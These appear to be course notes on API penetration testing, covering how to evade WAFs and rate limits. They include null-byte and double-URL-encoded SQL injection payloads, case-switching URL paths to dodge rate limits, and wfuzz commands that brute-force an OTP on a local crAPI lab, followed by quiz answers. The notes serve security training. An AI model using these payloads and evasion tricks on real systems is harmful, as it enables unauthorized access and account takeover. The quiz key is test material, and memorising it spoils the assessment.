# Evasive Maneuvers  

>[Evasive Maneuvers and Combining Techniques](https://university.apisec.ai/products/api-penetration-testing/categories/2150259129/posts/2159225365)  

## String Terminators  

```
%00
0x00
//
;
%
!
?
[]
%5B%5D
%09
%0a
%0b
%0c
%0e
```  

>Example, in the following injection attack to the user profile endpoint, the null bytes entered into the payload could bypass filtering

```
POST /api/v1/user/profile/update
[…]

{
"uname": "hapihacker"
"pass": "%00'OR 1=1"
}
```  

## Case Switching  

>example, POST requests a social media site by attempting an IDOR attack against a uid parameter in the following POST request:  

```
POST /api/myprofile 
[…] 

{uid=§0001§}
```  

>API may leverage rate-limiting to only allow 100 requests per minute.  
>Based on the length of the uid value, you know that to brute force it you’ll need to send 10,000 requests to exhaust all possibilities.  
>To bypass rate-limiting or other WAF controls you may be able to simply alter the URL path by switching upper- and lower-case letters in the path:  

```
POST /api/myprofile paired with uid 001 - 100

POST /api/Myprofile paired with uid 101 - 200

POST /api/mYprofile paired with uid 201 - 300
```  

## Encoding Payloads  

>Alternatively, use double encoding your attacks.  
>Imagine that the API provider has a control in place that provides one round of decoding to requests that are received.  

* URL Encoded Payload: %27%20%4f%52%20%31%3d%31%3b
* API Provider URL Decoder: ' OR 1=1;  

>WAF Rules detect a fairly obvious SQL Injection attack and block the payload.  

* Double URL Encoded Payload: %25%32%37%25%32%30%25%34%66%25%35%32%25%32%30%25%33%31%25%33%64%25%33%31%25%33%62  
* API Provider URL Decoder: %27%20%4f%52%20%31%3d%31%3b  

>Pass by a bad WAF rule to later be decoded and interpreted. Use Burp Suite and WFuzz.

## Payload Processing with Burp Suite  

>Intrudeor Payload Options & Processing:  

![crapi-evasive-maneuvers-waf-bypass-burp.png](/images/crapi-evasive-maneuvers-waf-bypass-burp.png)  

## Wfuzz Encoding payloads  

>Available Encoders: `wfuzz -e encoders`  

```
  Category      | Name              | Summary                                                                           
------------------------------------------------------------------------------------------------------------------------
  hashes        | base64            | Encodes the given string using base64                                             
  url           | doble_nibble_hex  | Replaces ALL characters in string using the %%dd%dd escape                        
  url_safe, url | double_urlencode  | Applies a double encode to special characters in string using the %25xx escape.   
                |                   | Letters, digits, and the characters '_.-' are never quoted.                       
  url           | first_nibble_hex  | Replaces ALL characters in string using the %%dd? escape                          
  default       | hexlify           | Every byte of data is converted into the corresponding 2-digit hex representatio  
                |                   | n.                                                                                
  html          | html_decimal      | Replaces ALL characters in string using the &#dd; escape                          
  html          | html_escape       | Convert the characters &<>" in string to HTML-safe sequences.                     
  html          | html_hexadecimal  | Replaces ALL characters in string using the &#xx; escape                          
  hashes        | md5               | Applies a md5 hash to the given string                                            
  db            | mssql_char        | Converts ALL characters to MsSQL's char(xx)                                       
  db            | mysql_char        | Converts ALL characters to MySQL's char(xx)                                       
  default       | none              | Returns string without changes                                                    
  db            | oracle_char       | Converts ALL characters to Oracle's chr(xx)                                       
  default       | random_upper      | Replaces random characters in string with its capitals letters                    
  url           | second_nibble_hex | Replaces ALL characters in string using the %?%dd escape                          
  hashes        | sha1              | Applies a sha1 hash to the given string                                           
  hashes        | sha256            | Applies a sha256 hash to the given string                                         
  hashes        | sha512            | Applies a sha512 hash to the given string                                         
  url           | uri_double_hex    | Encodes ALL charachers using the %25xx escape.                                    
  url           | uri_hex           | Encodes ALL charachers using the %xx escape.                                      
  url           | uri_triple_hex    | Encodes ALL charachers using the %25%xx%xx escape.                                
  url           | uri_unicode       | Replaces ALL characters in string using the %u00xx escape                         
  url_safe, url | urlencode         | Replace special characters in string using the %xx escape. Letters, digits, and   
                |                   | the characters '_.-' are never quoted.                                            
  url           | utf8              | Replaces ALL characters in string using the \u00xx escape                         
  url           | utf8_binary       | Replaces ALL characters in string using the \uxx escape
```  

>Sample Encoded attacks using `file` wordlist, or `list` of comman seperated:  

```
wfuzz -z file,wordlist/api/common.txt,base64 http://hapihacker.com/FUZZ
wfuzz -z list,a-b-c,base64-md5-none -u http://hapihacker.com/api/v2/FUZZ
```  

>***wfuzz*** using `file` as wordlist and encoding using, dashes `-` to seperate each type of encoder, Base64, then MD5, and also using payload as is, none encoded.  

```
wfuzz -c -d '{"email":"test2@test.com","otp":"FUZZ","password":"WrongPassword1"}' -H 'content-type: application/json' -z file,/home/kali/Downloads/apisec/numbers.txt,base64-md5-none -u http://127.0.0.1:8888/identity/api/auth/v2/check-otp
```  

![crapi-evasive-maneuvers-waf-bypass-wfuzz.png](/images/crapi-evasive-maneuvers-waf-bypass-wfuzz.png)  

>Successfully brute forced the OTP pin using the old version of the API, due to [Improper Assets Management vulnerability](https://github.com/botesjuan/APIsecurityUniversity/blob/main/module/Improper-Assets-Management.md)  
>Using the `@` character at sign tell WFUZZ to apply all encodings to payload at same time.  

>[WAF Evasion Techniques Guide](https://github.com/0xInfection/Awesome-WAF?tab=readme-ov-file#evasion-techniques)  

## Combining Techniques  

>Excessive Data Exposure and Improper Assets Management are both API weaknesses that stand out above the others to combine in order to escalate the impact of your attacks.  
>Improper Assets Management implies that a version of the API may not be as supported as the current version.  
>If you are testing a file upload function, attempt to use the directory traversal fuzzing attack along with the file upload to manipulate where the file is stored.  
>Broken Function Level Authorization (BFLA) or Mass Assignment weakness that give you access to administrative functionality.
>Mass assignment, give a chance that the parameter or parameters that you can alter may not be protected from injection attacks and/or Server-side Request Forgery.  
>API security controls like a WAF or rate-limiting, make sure to apply evasion techniques to your attacks.  
>Encode your attacks and attempt to find ways to bypass security measures.  

----  

>What common API security control can detect an attack and prevent you from making additional successful requests?  

* WAF  

>Which of the following Wfuzz commands will result in applying multiple rounds of encoding to a single payload?  

* `$wfuzz -z list,a-b-c,base64@md5@url -u http://target.com/api/v2/FUZZ`  

>Which of the following is ***not*** a method for evading or bypassing API security controls?  

* Injecting SQL commands  

>Which of the following would ***not*** trigger an API security mechanism?  

* Intense and consistent usage of Wireshark  

>Which of the following is ***not*** helpful for attempting to avoid API security controls?  

* Postman Collection Runner  

>Which of the following combinations of techniques were ***not*** used during the course to successfully exploit crAPI?  

* Injection + Mass Assignment  

>Which of the following vulnerabilities is best combined with other attack attempts?  

* Improper Assets Management  

----  
